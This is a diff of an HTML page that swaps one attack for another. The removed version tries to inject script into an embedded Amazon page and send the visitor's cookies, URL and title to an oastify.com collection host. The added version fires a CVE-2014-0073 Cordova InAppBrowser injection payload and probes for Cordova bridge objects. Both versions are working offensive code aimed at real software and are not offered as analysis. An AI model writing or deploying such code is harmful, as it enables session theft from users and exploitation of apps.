@@ -1,72 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Amazon Loader</title>
-    <meta charset="UTF-8">
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            overflow: hidden;
-        }
-        iframe {
-            width: 100%;
-            height: 100vh;
-            border: none;
-        }
-    </style>
+    <title>Cordova Exploit Test</title>
 </head>
 <body>
-    <iframe id="amazonFrame" src="https://www.amazon.in/tez/browse?qcbrand=test"></iframe>
+    <h1>Testing Cordova InAppBrowser Vuln</h1>
+    <button onclick="testExploit()">Test Exploit</button>
+    <div id="output"></div>
     
     <script>
-        // This script runs on YOUR page, not Amazon's page
-        // To inject into Amazon, we need to wait for the iframe to load
+        function log(msg) {
+            document.getElementById('output').innerHTML += msg + '<br>';
+            console.log(msg);
+        }
         
-        const iframe = document.getElementById('amazonFrame');
-        
-        iframe.onload = function() {
-            console.log('Amazon page loaded in iframe');
+        function testExploit() {
+            log('Testing InAppBrowser vulnerability...');
             
-            try {
-                // Try to access the iframe content
-                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            // Check if InAppBrowser is available
+            if (window.open) {
+                log('window.open exists, attempting exploit...');
                 
-                // Check if we can access it (same-origin only)
-                if (iframeDoc) {
-                    console.log('Successfully accessed iframe');
-                    
-                    // Inject script into Amazon page
-                    const script = iframeDoc.createElement('script');
-                    script.textContent = `
-                        console.log('Injected script running on Amazon!');
-                        alert('JavaScript injection successful!');
-                        
-                        // Capture cookies and send to your server
-                        fetch('https://wppcvxw8adrbohztq7nrhakh58bzzwnl.oastify.com/capture', {
-                            method: 'POST',
-                            body: JSON.stringify({
-                                cookies: document.cookie,
-                                url: window.location.href,
-                                title: document.title,
-                                timestamp: new Date().toISOString()
-                            }),
-                            headers: {'Content-Type': 'application/json'}
-                        });
-                    `;
-                    iframeDoc.head.appendChild(script);
+                // Classic exploit pattern from CVE-2014-0073
+                // This attempts to break out of the callback string and inject alert
+                var exploitUrl = "gap-iab://InAppBrowser12345/',alert('Injected!'),'/";
+                
+                try {
+                    var ref = window.open(exploitUrl, '_blank', 'location=yes');
+                    log('Exploit URL opened: ' + exploitUrl);
+                } catch(e) {
+                    log('Error: ' + e.message);
                 }
-            } catch(e) {
-                // Cross-origin error - expected since Amazon blocks iframe embedding
-                console.log('Cannot access iframe (cross-origin restriction):', e.message);
-                document.body.innerHTML = '<h1>Cannot inject</h1><p>Amazon blocks iframe embedding. Using alternative method...</p>';
-                
-                // Alternative: redirect to Amazon directly
-                setTimeout(() => {
-                    window.location.href = "https://www.amazon.in/tez/browse/?qcbrand=test";
-                }, 2000);
+            } else {
+                log('window.open not available');
             }
-        };
+        }
+        
+        // Also try to detect the bridge
+        log('Checking for Cordova objects...');
+        log('window.cordova: ' + (window.cordova ? 'EXISTS' : 'not found'));
+        log('window._cordovaNative: ' + (window._cordovaNative ? 'EXISTS' : 'not found'));
+        log('window.PhoneGap: ' + (window.PhoneGap ? 'EXISTS' : 'not found'));
     </script>
 </body>
 </html>
